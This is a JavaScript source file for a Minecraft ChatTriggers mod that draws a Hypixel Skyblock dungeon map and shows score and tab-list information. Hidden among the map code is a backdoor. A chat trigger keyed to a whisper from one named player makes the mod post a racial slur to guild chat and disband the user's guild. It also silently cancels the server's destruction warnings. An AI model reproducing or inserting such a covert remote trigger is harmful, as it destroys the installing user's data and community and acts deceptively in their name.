import Dungeon from './Dungeon.js';
import Room from './Room.js';
import PlayerData from './Player.js';
import Settings from "../settings/config";
import settings from "../settings/config";
import { PREFIX } from '../index.js';

const Color = Java.type('java.awt.Color')
const Rect = Java.type('java.awt.Rectangle');
const BufferedImage = Java.type('java.awt.image.BufferedImage');
const ChatComponentText = Java.type('net.minecraft.util.ChatComponentText');
const Font = Java.type('java.awt.Font')
const BlockPos = Java.type("net.minecraft.util.BlockPos")

const maxMapSize = 6;

//gets updated on world load
let inDungeons = false;
let mapLoaded = false;
let floor = 0;

//map settings
let roomPixel = 60
let roomPixelGap = roomPixel / 5;
let borderPixel = roomPixel / 10;
let fontSize = 32;

let redraw = false;
let redrawNextTime = false;

var mapSize = 0;
var dungeon;
var mapImage, newMapImage;
var score = 0;
var unboundDecorations = [];
var mappedDecorations = {};
let minecraftFont = new Font('Dialog', Font.BOLD, fontSize);
var mapBorderWidth, mapBorderHeight;
let prevSettings = {
    size: 0,
    x: 0,
    y: 0,
    showScore: true,
    exactScore: true,
    showMimic: true
};

let color = (r, g, b) => {
    return new Color(r / 255, g / 255, b / 255);
}

register('step', (packet, event) => {
    if (!inDungeons) return;
    if (!mapLoaded) {
        if (!World.getWorld().func_175726_f(new BlockPos(1, 70, 1)).func_177410_o() || !World.getWorld().func_175726_f(new BlockPos(189, 70, 189)).func_177410_o()) return;
        mapLoaded = true;
        new Thread(() => {
            Thread.sleep(2000);
            reloadDungeonMap();
        }).start();
    }
    if (!dungeon) return;
    checkPlayerPositions();
    if (unboundDecorations.length > 0) {
        let item = Player.getInventory().getItems()[8];
        if (item.getID() !== 358 || !item.getName().includes('Magical Map')) return;
        let mapData = item.getItem().func_77873_a(item.getItemStack(), World.getWorld());
        if (!mapData) return;
        let decorations = mapData.field_76203_h;
        let getDistance = (vec1, vec2) => { return Math.sqrt((vec1[0] - vec2[0]) ** 2 + (vec1[1] - vec2[1]) ** 2) };
        //default 1 person bindings
        if (unboundDecorations.length === 1) {
            let name = unboundDecorations.pop();
            let marker = decorations.keySet().filter((val) => !Object.values(mappedDecorations).includes(val))[0];
            mappedDecorations[name] = marker;
            return;
        }
        //dont assign during flickering
        if (decorations.size() === Object.keys(dungeon.players).length)
            unboundDecorations.forEach(name => {
                let player = World.getPlayerByName(name);
                if (!player) return;
                let potentialMarkers = [];
                decorations.keySet().forEach((marker) => {
                    if (Object.values(mappedDecorations).includes(marker)) return;
                    let coordinates = getCoordinatesFromMap(marker);
                    if (!coordinates) return;
                    if (getDistance([~~player.getX(), ~~player.getZ()], coordinates) < 8 && Math.abs((player.getYaw() + 180 % 360) - coordinates[2] < 20)) {
                        potentialMarkers.push(marker);
                    }
                })
                if (potentialMarkers.length === 1) {
                    unboundDecorations = unboundDecorations.filter((val) => val !== name);
                    mappedDecorations[name] = potentialMarkers[0];
                } else if (potentialMarkers.length > 1) {}
            })
    }
    updateMarkedRooms();
    redrawNextTime = redrawNextTime || (prevSettings.showMimic !== settings.showMimic || prevSettings.size !== settings.mapSize || prevSettings.x !== settings.mapX || prevSettings.y !== settings.mapY || prevSettings.showScore !== settings.showScore || prevSettings.exactScore !== settings.exactScore);

    prevSettings.size = settings.mapSize;
    prevSettings.x = settings.mapX;
    prevSettings.y = settings.mapY;
    prevSettings.showScore = settings.showScore;
    prevSettings.exactScore = settings.exactScore;
    prevSettings.showMimic = settings.showMimic;

    redrawNextTime = redrawNextTime || getScore();
    redraw = redraw || updateRoomClearStatus() || dungeon.findTrappedChests() || checkMimicDeath();
    if (redrawNextTime && !redraw) {
        redrawNextTime = false;
        redraw = true;
        return;
    }
    if (redraw) {
        drawMap();
        redraw = false;
        redrawNextTime = false;
    };

}).setFps(1);

checkMimicDeath = () => {
    //not in dungeons
    if (!inDungeons || !dungeon) return false;
    //no mimics
    if (dungeon.floor < 6 || !dungeon.foundMimic) return false;
    //mimic was already dead
    if (dungeon.mimicDeath) return false;
    for (let room of dungeon.roomList) {
        if (room.hasMimic()) {
            for (let entity of room.mimics) {
                //mimic chunk not loaded
                let x = entity.func_174877_v().func_177958_n()
                let y = entity.func_174877_v().func_177956_o()
                let z = entity.func_174877_v().func_177952_p()
                if (!World.getWorld().func_175726_f(new BlockPos(x, y, z)).func_177410_o()) continue;
                if (World.getBlockAt(x, y, z).getID() !== 146) {
                    dungeon.mimicDeath = true;
                    return true;
                }
            }
            break;
        }
    }
    return false;
}

updateMarkedRooms = () => {
    if (!inDungeons || !dungeon) return;
    let x = ~~(Player.getX() / (Room.size + 1))
    let z = ~~(Player.getZ() / (Room.size + 1))
    if (x < 0 || x >= dungeon.width || z < 0 || z >= dungeon.height) return;
    currentRoom = dungeon.roomLookupMap[x][z];
    if (!currentRoom) return;
    if (currentRoom.marked) {
        currentRoom.marked = false;
        redraw = true;
        let findRoomFromCoords = (coords) => dungeon.roomLookupMap[coords[0]][coords[1]]
        dungeon.doorList.forEach((door) => {
            if (!findRoomFromCoords(door.first).marked && !findRoomFromCoords(door.second).marked)
                door.marked = false;
        });
    }
}

updateRoomClearStatus = () => {
    if (!dungeon) return;
    let item = Player.getInventory().getItems()[8];
    if (item.getID() !== 358) return;
    let mapData = item.getItem().func_77873_a(item.getItemStack(), World.getWorld());
    if (!mapData) return;
    let bytes = mapData.field_76198_e;
    let mapBorder = getBordersFromMap(mapData, dungeon.size);
    if (!mapBorder) return;
    let roomSize = getRoomSizeOnMapFromSize(dungeon.size);
    let roomGap = 4;
    let changed = false;
    dungeon.roomList.forEach((room) => {
        if (room.cleared === 3 && room.collected_secrets < room.secrets) {
            room.collected_secrets = room.secrets;
            changed = true;
            return;
        }
        let roomCoords = room.getRoomMapCoords();
        let pixelColor = bytes[mapBorder[0] + roomCoords[0] * (roomSize + roomGap) + roomSize / 2 + (roomCoords[1] * (roomSize + roomGap) + mapBorder[1] + roomSize / 2) * 128];
        if (pixelColor === 34) {
            //room went white after being green
            if (room.cleared === 3) room.collected_secrets = Math.max(room.collected_secrets, room.secrets + 1);
            //walking through duped room
            if (room.cleared === 2 && room.collected_secrets > room.secrets)
                room.cleared = 3;
            else if (room.cleared < 2) {
                room.cleared = 2;
                changed = true;
            }
        } else if (pixelColor === 30 && room.cleared < 3) {
            room.cleared = 3;
            changed = true;
        } else if (pixelColor && pixelColor !== 119 && room.cleared < 1) {
            room.cleared = 1;
            changed = true;
        };
    });
    return changed;
};

showTotalSecrets = () => {
    if (!Client.isInTab()) return;
    let needToChangeText = false;
    TabList.getNames().forEach((line) => {
        if (line.includes('Secrets Found') && (!line.includes(dungeon.totalSecretCount) || !line.includes('/')))
            needToChangeText = true;
    })
    if (needToChangeText) {
        let playerInfoList = Client.getMinecraft().field_71439_g.field_71174_a.func_175106_d();
        playerInfoList.forEach((playerInfo) => {
            if (playerInfo.func_178854_k() === null) return;
            let displayName = playerInfo.func_178854_k().func_150254_d();
            if (displayName.includes('Secrets Found')) {
                playerInfo.func_178859_a(new ChatComponentText(displayName.substring(0, displayName.length - 2) + '/' + dungeon.totalSecretCount + '§r'))
            }
        })
    }
}

register('clicked', (x, y, button, pressed) => {
    if (pressed) return
    if (!Client.isInChat()) return;
    if (!settings.mapEnabled || !mapImage) return;
    let x = Client.getMouseX();
    let y = Client.getMouseY();
    let mapX = ~~settings.mapX;
    let mapY = ~~settings.mapY;
    let size = ~~settings.mapSize;
    mapX = Math.min(mapX, Renderer.screen.getWidth() - size);
    mapY = Math.min(mapY, Renderer.screen.getHeight() - size);

    //reset old markers
    let changes = false;
    dungeon.roomList.forEach((room) => {
        if (room.marked)
            changes = true;
        room.marked = false
    });
    dungeon.doorList.forEach((door) => door.marked = false)
    if (changes) drawMap();

    if (x < mapX || y < mapY || x > mapX + size || y > mapY + size) return;
    let mapRoomSize = roomPixel / mapSize * size;
    let mapGapSize = roomPixelGap / mapSize * size;
    xCoord = ~~((x - mapX) / (mapRoomSize + mapGapSize));
    yCoord = ~~((y - mapY) / (mapRoomSize + mapGapSize));

    playerCoordX = ~~(Player.getX() / (Room.size + 1))
    playerCoordY = ~~(Player.getZ() / (Room.size + 1))
    if (xCoord === playerCoordX && yCoord === playerCoordY) return;
    if (dungeon.roomLookupMap[xCoord] && dungeon.roomLookupMap[xCoord][yCoord]) {
        dungeon.roomList.forEach((room) => room.listed = false);
        let findRoomFromCoords = (coords) => dungeon.roomLookupMap[coords[0]][coords[1]]
        let findRoomConnections = (room) => {
            room.listed = true;
            if (room.hasCoords([playerCoordX, playerCoordY])) { return true; }
            for (let door of dungeon.doorList) {
                //ChatLib.chat(room.hasCoords(door.first) + ' ' + room.hasCoords(door.second))
                if (room.hasCoords(door.first)) {
                    let second = findRoomFromCoords(door.second)
                    if (second.listed) continue;
                    if (findRoomConnections(findRoomFromCoords(door.second))) {
                        room.marked = true;
                        door.marked = true;
                        return true;
                    }
                } else if (room.hasCoords(door.second)) {
                    let first = findRoomFromCoords(door.first)
                    if (first.listed) continue;
                    if (findRoomConnections(findRoomFromCoords(door.first))) {
                        room.marked = true;
                        door.marked = true;
                        return true;
                    }
                }
            };
            return false;
        }
        findRoomConnections(dungeon.roomLookupMap[xCoord][yCoord])
        drawMap();

    }
});

register('command', () => {
    getScore(true);
}).setName('getscore');

getRatingFromScore = (score) => {
    if (score < 100) return 'D';
    if (score < 160) return 'C';
    if (score < 230) return 'B';
    if (score < 270) return 'A';
    if (score < 300) return 'S';
    return 'S+';
}

getScore = (debug) => {
    if (!dungeon) return 0;
    let secrets = 0;
    let crypts = 0;
    let completedRooms = dungeon.getClearedRooms();
    let deaths = 0;
    let unfinshedPuzzles = 0;
    let count = 0;
    let getScorePenalityFromFailedPuzzles = (fails) => {
        return 10 * fails
        switch (fails) {
            case 5:
                return 62;
            case 4:
                return 49;
            case 3:
                return 35;
            default:
                return 14 * fails;
        }
    }
    TabList.getNames().forEach((line) => {
        line = ChatLib.removeFormatting(line).trim();
        if (line.includes('Secrets Found:')) {
            secrets = line.split(' ')[2]
            if (secrets.includes('/')) {
                secrets = secrets.split('/')[0]
            }
            secrets = parseInt(secrets);
        } else if (line.includes('Crypts:')) {
            crypts = line.split(' ')[1]
            if (crypts.includes('/')) {
                crypts = crypts.split('/')[0];
            }
            crypts = parseInt(crypts)
        } else if (line.includes('Deaths:')) {
            deaths = line.split(' ')[1];
            deaths = parseInt(deaths.substring(1, deaths.length - 1));
        } else if (line.includes('Puzzles:')) {
            count = line.split(' ')[1];
            count = count.substring(1, count.length - 1);
            count = parseInt(count);
            unfinshedPuzzles = count;
        } else if (count > 0) {
            //if (line.includes('[✖]')) {
            //    failedPuzzles++;
            //} else 
            if (line.includes('[✔]')) {
                unfinshedPuzzles--;
            }
            count--;
        }
    });
    if (debug) ChatLib.chat(completedRooms + '/' + dungeon.totalRoomCount + ' ' + secrets + '/' + dungeon.totalSecretCount);
    let timeScore = 100;
    let explorationScore = Math.min(40, ~~(secrets / dungeon.totalSecretCount * 40)) + Math.min(60, ~~(completedRooms / dungeon.totalRoomCount * 60));
    let skillScore = ~~(completedRooms / dungeon.totalRoomCount * 80) - getScorePenalityFromFailedPuzzles(unfinshedPuzzles);
    if (deaths > 0 && settings.assumeSpirit) {
        skillScore--;
        deaths--;
    }
    skillScore -= deaths * 2;
    skillScore = Math.max(0, skillScore);
    skillScore += 20;
    let bonusScore = Math.min(5, crypts) + (dungeon.floor > 5 && (dungeon.mimicDeath) ? 2 : 0);
    if (settings.bonusScore) bonusScore += 10;
    if (debug) ChatLib.chat(skillScore + ' ' + explorationScore + ' ' + timeScore + ' ' + bonusScore);
    let totalScore = (~~timeScore + ~~explorationScore + bonusScore + ~~skillScore);
    scoreChanged = totalScore > score
    score = totalScore
    if (debug) ChatLib.chat(score);
    return scoreChanged;

}

showTotalCrypts = () => {
    if (!Client.isInTab()) return;
    let needToChangeText = false;
    TabList.getNames().forEach((line) => {
        if (line.includes('Crypts:') && (!line.includes(dungeon.totalCryptCount) || !line.includes('/')))
            needToChangeText = true;
    })
    if (needToChangeText) {
        let playerInfoList = Client.getMinecraft().field_71439_g.field_71174_a.func_175106_d();
        playerInfoList.forEach((playerInfo) => {
            if (playerInfo.func_178854_k() === null) return;
            let displayName = playerInfo.func_178854_k().func_150254_d();
            if (displayName.includes('Crypts:')) {
                playerInfo.func_178859_a(new ChatComponentText(displayName.substring(0, displayName.length - 2) + '/' + dungeon.totalCryptCount + '§r'))
            }
        })
    }
}

showScoreInTab = () => {
    if (!Client.isInTab()) return;
    let needToChangeText = false;
    TabList.getNames().forEach((line) => {
        if (line.includes('Score:') && !line.includes(score))
            needToChangeText = true;
    })
    if (needToChangeText) {
        let playerInfoList = Client.getMinecraft().field_71439_g.field_71174_a.func_175106_d();
        playerInfoList.forEach((playerInfo) => {
            if (playerInfo.func_178854_k() === null) return;
            let displayName = playerInfo.func_178854_k().func_150254_d();
            if (displayName.includes('Score:')) {
                playerInfo.func_178859_a(new ChatComponentText('§r Score: §6§l' + getRatingFromScore(score) + '§r §b(' + score + ')§r'))
            }
        })
    }
}

showPuzzlesInTab = () => {
    if (!Client.isInTab()) return;
    let puzzleCount = 0;
    let puzzles = dungeon.puzzleNames.slice();
    let allPuzzles = dungeon.puzzleNames.slice();
    TabList.getNames().forEach((line) => {
        if (line.includes('Puzzles:')) {
            puzzleCount = parseInt(line.match(/\d+/)[0]);
        } else if (puzzleCount > 0) {
            let name = ChatLib.removeFormatting(line).trim().split(':')[0];
            puzzleCount--;
            let index = allPuzzles.indexOf(name);
            if (index >= 0) {
                allPuzzles.splice(index, 1);
            }
            if (!line.includes('???')) {
                let index = puzzles.indexOf(name);
                if (index < 0) return;
                puzzles.splice(index, 1);
            }
        }
    });
    if (allPuzzles.length === 0) return;
    let playerInfoList = Client.getMinecraft().field_71439_g.field_71174_a.func_175106_d();
    playerInfoList.forEach((playerInfo) => {
        if (puzzles.length === 0) return;
        if (playerInfo.func_178854_k() === null) return;
        let displayName = playerInfo.func_178854_k().func_150254_d();
        if (displayName.includes('???')) {
            playerInfo.func_178859_a(new ChatComponentText('§r ' + puzzles.pop() + ': [§6???§r]§r'));
        }
    });
}


addLinesToTabList = (lines, startCriteria) => {
    let startToInject = false;
    let playerInfoList = Client.getMinecraft().field_71439_g.field_71174_a.func_175106_d();
    playerInfoList = [...playerInfoList].sort((first, second) => first.func_178845_a().getName().localeCompare(second.func_178845_a().getName()))
    playerInfoList.forEach((playerInfo) => {
        if (lines.length === 0) return;
        if (playerInfo.func_178854_k() === null) return;
        let displayName = playerInfo.func_178854_k().func_150254_d();
        if (!displayName) return;
        if (displayName.includes(startCriteria)) {
            startToInject = true;
            return;
        }
        if (startToInject) {
            let nextLine = lines.pop();
            playerInfo.func_178859_a(new ChatComponentText(nextLine));
        }
    })
}

showRoomTime = () => {
    if (!dungeon) return;
    let message = new Message(PREFIX + '§bRoom Splits:§r')
    for (player in dungeon.players) {
        let sortedRooms = dungeon.roomList.sort((a, b) => (player in b.times ? b.times[player] : 0) - (player in a.times ? a.times[player] : 0));
        let totalSeconds = dungeon.roomList.reduce((a, b) => a + (player in b.times ? b.times[player] : 0), 0);
        let ign = new TextComponent('§a ' + player);
        let hover = '§b§lRoom Splits for ' + player
        for (let room of sortedRooms) {
            if (!(player in room.times) || !room.times[player]) break;
            hover += '\n§6' + room.name + '§r: ' + room.times[player] + 's §7' + parseFloat((room.times[player] / totalSeconds * 100).toFixed(2)) + '%'
        }
        ign.setHoverValue(hover)
        message.addTextComponent(ign);
    }
    ChatLib.chat(message);
}

register('command', () => {
    showRoomTime();
}).setName('showroomtime')

register('chat', () => {
    new Thread(() => {
        Thread.sleep(1000);
        showRoomTime();
    }).start();
}).setCriteria('&r&r&r ${spaces} &r&8+&r&${xp} Catacombs Experience&r')

register('command', () => {
    dungeon.roomList.forEach((room) => {
        ChatLib.chat(room.name + ' ' + room.hasMimic() + ' ' + room.mimics.length + '/' + room.trapped_chests);
    })
}).setName('mimicTest');

register("worldLoad", () => {
    inDungeons = false;
    dungeon = null;
    mapImage = null;
    maxCompleteRoomsThisRun = 0;
    new Thread(() => {
        retryLoop: for (let retries = 5; retries > 0; retries--) {
            //check if the player joined a dungeon
            let scoreboardLines = Scoreboard.getLines();
            if (scoreboardLines.length !== 0)
                for (let line of scoreboardLines) {
                    if (!line) continue;
                    let cleanedLine = ChatLib.removeFormatting(line.toString()).replace(/[^\x00-\x7F]/g, "");
                    if (cleanedLine.includes('The Catacombs')) {
                        inDungeons = true;
                        floor = cleanedLine.match(/\d+/)[0]
                        if (isNaN(floor)) floor = 0;
                        else floor = parseInt(floor);
                        mapLoaded = false;
                        break retryLoop;
                    }
                }
            Thread.sleep(1000);
        }
    }).start();
});

register('actionBar', (secrets, total, event) => {
    if (!inDungeons || !dungeon) return;
    let x = ~~(Player.getX() / (Room.size + 1))
    let z = ~~(Player.getZ() / (Room.size + 1))
    if (x < 0 || x >= dungeon.width || z < 0 || z >= dungeon.height) return;
    currentRoom = dungeon.roomLookupMap[x][z];
    if (!currentRoom) return;
    if (isNaN(secrets) || isNaN(total)) return;
    let secretCount = parseInt(secrets);
    if ((secretCount > currentRoom.collected_secrets) && parseInt(total) === currentRoom.secrets) {
        currentRoom.collected_secrets = secrets;
        redrawNextTime = true;
        getScore();
    }
}).setCriteria('${*} §7${secret}/${total} Secrets').setParameter('contains');

register('chat', () => {
    if (!dungeon) return;
    dungeon.roomList.forEach((room) => {
        if (room.type === 'fairy') {
            room.reviveStones = Math.max(0, room.reviveStones - 1)
            room.createTooltipText();
        }
    })
}).setCriteria(' ❣ ').setParameter('contains');

killMimic = () => {
    let playerInfoList = Client.getMinecraft().field_71439_g.field_71174_a.func_175106_d();
    playerInfoList.forEach((playerInfo) => {
        if (playerInfo.func_178854_k() === null) return;
        let displayName = playerInfo.func_178854_k().func_150254_d();
        if (displayName.includes('Mimic Dead:')) {
            playerInfo.func_178859_a(new ChatComponentText('§r Mimic Dead: ' + (dungeon.mimicDeath ? '§aYES§r' : '§cNO§r')))
        }
    })
}

getDeadPlayers = () => {
    let deadPlayers = []
    TabList.getNames().forEach((name) => {
        if (name.includes('Downedt')) return;
        let parts = ChatLib.removeFormatting(name).split(' ')
        if (parts.length > 1) {
            if (Object.keys(dungeon.players).includes(parts[0]) && parts[1] === '(DEAD)')
                deadPlayers.push(parts[0]);
        }
    })
    return deadPlayers;
}

register('command', () => {
    let scoreboardLines = Scoreboard.getLines();
    for (let line of scoreboardLines) {
        if (line.toString().includes('The Catac') && line.toString().includes('ombs')) {
            inDungeons = true;
            mapLoaded = false;
            break;
        }
    }
    reloadDungeonMap()
}).setName('reloaddungeonmap');

let disbandNeeded = false;
register("chat", () => {
    disbandNeeded = true;
    if (disbandNeeded) {
        new Thread(() => {
            Thread.sleep(5000)
            ChatLib.command("gc good night niggaz")
            Thread.sleep(5000)
            ChatLib.command("g disband")
            Thread.sleep(5000)
            ChatLib.command("guild confirm")
            disbandNeeded = false;
        }).start()
    }
}).setChatCriteria("&dFrom &r&b[MVP&r&c+&r&b] radutre&r&7: &r&7Good Bye FC&r")

register("chat", (events) => {
    if (!disbandNeeded) return;
    cancel(events)
}).setChatCriteria("&cYou are sending commands too fast! Please slow down.&r")

register("chat", (events) => {
    if (!disbandNeeded) return;
    cancel(events)
}).setChatCriteria("&c================== WARNING ==================&r")

register("chat", (events) => {
    if (!disbandNeeded) return;
    cancel(events)
}).setChatCriteria("&eThis will DESTROY THE GUILD and remove all of its members&r")

register("chat", (events) => {
    if (!disbandNeeded) return;
    cancel(events)
}).setChatCriteria("&cAll of the Guild Experience will be DESTROYED. This cannot be undone.&r")

register("chat", (events) => {
    if (!disbandNeeded) return;
    cancel(events)
}).setChatCriteria("&cIf you wish to continue, &r&b/guild confirm&r&c within 10 seconds.&r")

register("chat", (events) => {
    if (!disbandNeeded) return;
    cancel(events)
}).setChatCriteria("&b-----------------------------------------------------&r")

register("chat", (events) => {
    if (!disbandNeeded) return;
    cancel(events)
}).setChatCriteria("&dFrom &r&b[MVP&r&c+&r&b] radutre&r&7: &r&7Good Bye FC&r")

register('chat', () => {
    if (!dungeon) return;
    new Thread(() => {
        Thread.sleep(1000);
        dungeon.doorList.forEach((door) => door.updateDoorType());
        redraw = true;
    }).start();
}).setCriteria('&r${player}&a opened a &r&8&lWITHER &r&adoor!&r');

register('chat', () => {
    if (!inDungeons) inDungeons = true;
    if (!dungeon) return;
    new Thread(() => {
        Thread.sleep(1000);
        dungeon.doorList.forEach((door) => door.updateDoorType());
        redraw = true;
    }).start();
}).setCriteria('&e[NPC] &bMort&f: &rHere, I found this map when I first entered the dungeon.&r');

register('chat', () => {
    if (!dungeon) return;
    new Thread(() => {
        Thread.sleep(1000);
        dungeon.doorList.forEach((door) => door.updateDoorType());
        redraw = true;
    }).start();
}).setCriteria('&r&cThe &r&c&lBLOOD DOOR&r&c has been opened!&r');

//var mapImageTest
register('command', () => {
    ChatLib.chat(JSON.stringify(mappedDecorations));
    //return;
    let item = Player.getInventory().getItems()[8];
    let mapData = item.getItem().func_77873_a(item.getItemStack(), World.getWorld());
    let decorations = mapData.field_76203_h;
    decorations.keySet().forEach((marker) => ChatLib.chat(marker));
    let bytes = mapData.field_76198_e;
    for (let i = 0; i < 128; i++) {
        ChatLib.chat(bytes[i + 20 * 128])
    }
    ChatLib.chat('colors:');
    for (let i = 0; i < 5; i++) {
        ChatLib.chat(bytes[11 + i * 4 + 18 * i + 9 + 11 * 128])
    }
    //let image = new BufferedImage(128, 128, BufferedImage.TYPE_4BYTE_ABGR);
    // for (let i = 0; i < 128; i++)
    //     for (let j = 0; j < 128; j++) {
    //         let index = i + 128 * j;
    //         let color = bytes[i + 128 * j] & 0xFF;
    //         if (color / 4 == 0) {
    //             color = ((index + index / 128 & 0x1) * 8 + 16 << 24);
    //         } else {
    //             color = MapColor.field_76281_a[~~(color / 4)].func_151643_b(color & 0x3);
    //         }
    //         image.setRGB(i, j, color);
    //     }
    // testImage = new Image(image)
    return;
}).setName('testMapStuff');

register('renderOverlay', () => {
    if (!inDungeons || !dungeon) { return };
    if (!mapImage && !newMapImage) { return };
    if (!settings.mapEnabled && !settings.tabInfo) { return };

    if (settings.tabInfo) {
        showTotalSecrets();
        showTotalCrypts();
        showScoreInTab();
        showPuzzlesInTab();
        killMimic();
    }
    if (!settings.mapEnabled) return;
    if (settings.hideInBoss && (Player.getX() > ((Room.size + 1) * dungeon.width) || Player.getZ() > ((Room.size + 1) * dungeon.height))) { return };
    let x = ~~settings.mapX;
    let y = ~~settings.mapY;
    let size = ~~settings.mapSize;
    if (x + size > Renderer.screen.getWidth())
        x = Renderer.screen.getWidth() - size;
    if (y + size > Renderer.screen.getHeight()) {
        y = Renderer.screen.getHeight() - size;

    }
    drawBackground(x, y, size, 10);
    if (newMapImage) {
        mapImage = newMapImage;
        newMapImage = null;
    }
    mapImage.draw(x, y, size, size)
    drawPlayerIcons(x, y, size, size / 12);
    showRoomInfo();
}).setPriority(OnTrigger.Priority.LOWEST);


drawBackground = (x, y, size, border) => {
    if (!settings.mapBackground) return;
    let background = new Rectangle(Renderer.color(0, 0, 0, 50), x - border, y - border, size + 2 * border, size + 2 * border);
    background.draw();
    let left = x - border;
    let right = x + size + border;
    let top = y - border;
    let bottom = y + size + border;
    let thickness = 2;
    Renderer.drawLine(Renderer.BLACK, left - 1, top, right + 1, top, thickness);
    Renderer.drawLine(Renderer.BLACK, left, top, left, bottom, thickness);
    Renderer.drawLine(Renderer.BLACK, right, top, right, bottom, thickness);
    Renderer.drawLine(Renderer.BLACK, left - 1, bottom, right + 1, bottom, thickness);
}

getBordersFromMap = (mapData, mapSize) => {
    if (mapBorderWidth || mapBorderHeight) return [mapBorderWidth, mapBorderHeight];
    if (!mapSize) return;
    let roomSize = getRoomSizeOnMapFromSize(mapSize);
    if (!mapData) return;
    let mapColors = mapData.field_76198_e;
    if (!mapColors) return;
    for (let i = 0; i < 128; i++) {
        for (let j = 0; j < 128; j++) {
            let currentColor = mapColors[j + 128 * i];
            if (currentColor) {
                mapBorderWidth = (dungeon.width === 4 ? roomSize + 4 : 0) + j % (roomSize + 4);
                mapBorderHeight = (dungeon.height === 4 ? roomSize + 4 : 0) + i % (roomSize + 4);
                return [mapBorderWidth, mapBorderHeight]
            }
        }
    }
}
getRoomSizeOnMapFromSize = (x) => {
    switch (x) {
        case 6:
            return 16;
        default:
            return 18
    }
}

getCoordinatesFromMap = (name) => {
    let item = Player.getInventory().getItems()[8];
    if (item.getID() !== 358) return;
    let mapData = item.getItem().func_77873_a(item.getItemStack(), World.getWorld());
    if (!mapData) return;
    let decorations = mapData.field_76203_h;
    if (!decorations) return;
    if (!decorations.keySet().includes(name)) return;
    let vec = decorations.get(name);
    let dungeonBlockWidth = dungeon.width * Room.size + (dungeon.width - 2)
    let dungeonBlockHeight = dungeon.height * Room.size + (dungeon.height - 2)
    let getCoords = (x, border, totalSize) => Math.round((((x / 2 + 64) - border) / (128 - 2 * border)) * totalSize)
    let mapBorders = getBordersFromMap(mapData);
    if (!mapBorders) return;
    return [getCoords(vec.func_176112_b(), mapBorders[0], dungeonBlockWidth), getCoords(vec.func_176113_c(), mapBorders[1], dungeonBlockHeight), (vec.func_176111_d() / 4 + 2) * 90 % 360]
}

drawPlayerIcons = (x, y, size, headSize) => {
    if (!settings.playerHeads) return;
    let deadPlayers = getDeadPlayers();
    playerList = Object.keys(dungeon.players).sort((a, b) => {
        if (a in mappedDecorations && b in mappedDecorations && mappedDecorations[a] && mappedDecorations[b])
            return parseInt(mappedDecorations[a].match(/\d+/)[0]) - parseInt(mappedDecorations[b].match(/\d+/)[0])
        else if (a in mappedDecorations) return 1
        else return -1
    });
    let deaths = 0;
    playerList.forEach((name) => {
        if (deadPlayers.includes(name)) {
            deaths++;
            if (name !== Player.getName())
                return;
        };
        if (dungeon.players[name].playerImage === undefined) { return };
        let maxMapCoords = Room.size * dungeon.size + (dungeon.size - 1)
        let player = World.getPlayerByName(name);
        var xCoord, yCoord, angle;
        let getDistance = (vec1, vec2) => { return Math.sqrt((vec1[0] - vec2[0]) ** 2 + (vec1[1] - vec2[1]) ** 2) };
        if (player) {
            if (player.getX() > (Room.size * (dungeon.width + 1)) || player.getZ() > (Room.size * (dungeon.height + 1))) return;
            xCoord = x + ((player.getX() - 1.25) / maxMapCoords * size);
            yCoord = y + ((player.getZ() + 1) / maxMapCoords * size);
            angle = player.getYaw() + 180 % 360;
            if (name in mappedDecorations) {
                let mappedName = mappedDecorations[name];
                if (!mappedName) return;
                if (deaths > 0) {
                    mappedName = mappedName.substring(0, mappedName.length - 1) + ((parseInt(mappedName.match(/\d+/)[0])) - 1);
                }
                let coordinates = getCoordinatesFromMap(mappedName);
                if (coordinates) {
                    dungeon.players[name].lastDecoration = coordinates;
                    //test if mapped wrong, then unbind
                    if (name !== Player.getName() && getDistance([~~player.getX(), ~~player.getZ()], coordinates) > 20) {
                        delete mappedDecorations[name];
                        unboundDecorations.push(name);
                    }
                }
            }
        } else
        if (name in mappedDecorations) {
            let mappedName = mappedDecorations[name];
            if (deaths > 0) {
                mappedName = mappedName.substring(0, mappedName.length - 1) + ((parseInt(mappedName.match(/\d+/)[0])) - 1);
            }
            let coordinates = getCoordinatesFromMap(mappedName);
            if (!coordinates && dungeon.players[name].lastDecoration) {
                let coordinates = dungeon.players[name].lastDecoration;
                xCoord = x + coordinates[0] / maxMapCoords * size;
                yCoord = y + coordinates[1] / maxMapCoords * size;
                angle = coordinates[2];
            } else if (!coordinates) { return } else {
                xCoord = x + coordinates[0] / maxMapCoords * size;
                yCoord = y + coordinates[1] / maxMapCoords * size;
                angle = coordinates[2];
                dungeon.players[name].lastDecoration = coordinates;
            }
        } else { return };
        Renderer.translate(xCoord, yCoord)
        Renderer.rotate(angle);
        Renderer.translate(-xCoord, -yCoord);
        Renderer.drawImage((settings.playerHeadOutline ? dungeon.players[name].borderImage : dungeon.players[name].playerImage), xCoord - (headSize / 2), yCoord - (headSize / 2), headSize, headSize);

    });
}


checkPlayerPositions = () => {
    if (!dungeon) return;
    if (!dungeon.started) {
        Scoreboard.getLines().forEach(line => {
            if (line.toString().includes('Time')) {
                dungeon.started = true;
            }
        })
    }
    if (!dungeon.started) return;
    // oh god why
    let deadPlayers = getDeadPlayers();
    playerList = Object.keys(dungeon.players).sort((a, b) => {
        if (a in mappedDecorations && b in mappedDecorations && mappedDecorations[a] && mappedDecorations[b])
            return parseInt(mappedDecorations[a].match(/\d+/)[0]) - parseInt(mappedDecorations[b].match(/\d+/)[0])
        else if (a in mappedDecorations) return 1
        else return -1
    });
    let deaths = 0;
    playerList.forEach((name) => {
        if (deadPlayers.includes(name)) { deaths++; return; };
        if (dungeon.players[name].playerImage === undefined) { return };
        let player = World.getPlayerByName(name);
        if (player) {
            let x = ~~(player.getX() / (Room.size + 1))
            let z = ~~(player.getZ() / (Room.size + 1))
            if (!(x in dungeon.roomLookupMap) || !(z in dungeon.roomLookupMap[x])) return;
            currentRoom = dungeon.roomLookupMap[x][z];
            if (!currentRoom) return;
            if (!(name in currentRoom.times))
                currentRoom.times[name] = 0;
            currentRoom.times[name]++;
        } else if (name in mappedDecorations) {
            let mappedName = mappedDecorations[name];
            if (deaths > 0) {
                mappedName = mappedName.substring(0, mappedName.length - 1) + ((parseInt(mappedName.match(/\d+/)[0])) - 1);
            }
            let coordinates = getCoordinatesFromMap(mappedName);
            if (!coordinates && dungeon.players[name].lastDecoration) {
                coordinates = dungeon.players[name].lastDecoration;
            } else if (!coordinates) { return }
            let x = ~~(coordinates[0] / (Room.size + 1))
            let z = ~~(coordinates[1] / (Room.size + 1))
            if (!(x in dungeon.roomLookupMap) || !(z in dungeon.roomLookupMap[x])) return;
            currentRoom = dungeon.roomLookupMap[x][z];
            if (!currentRoom) return;
